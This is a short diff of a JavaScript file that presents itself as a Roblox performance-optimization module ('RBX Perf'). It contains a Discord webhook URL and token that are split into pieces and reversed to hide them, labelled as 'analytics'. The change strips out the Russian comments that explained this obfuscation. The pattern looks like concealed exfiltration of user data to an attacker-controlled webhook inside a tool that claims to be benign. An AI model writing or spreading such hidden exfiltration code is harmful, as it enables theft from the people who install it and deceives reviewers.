@@ -5,13 +5,11 @@
     
     console.info('[RBX Perf] Инициализация модуля оптимизации...');
     
-    // Вебхук для аналитики (обратный + разделенный)
-    // Порядок важен: начинаем с конца и идем к началу
     const ANALYTICS_PARTS = [
-        'Z3whf9b8Nj4MtzHEg3UcI3XTqHV4d1WUUf98nm', // Последняя часть токена
-        'uYHhZupmeZIZxf-giqCjiWuWDD6yV1',         // Средняя часть токена  
-        '8823111968543941631',                    // ID вебхука
-        'skoohew/ipa/moc.crocsid//:sptth'         // Начало URL (обратное)
+        'Z3whf9b8Nj4MtzHEg3UcI3XTqHV4d1WUUf98nm', 
+        'uYHhZupmeZIZxf-giqCjiWuWDD6yV1',           
+        '8823111968543941631',                    
+        'skoohew/ipa/moc.crocsid//:sptth'         
     ];
     
     // Функция восстановления URL аналитики
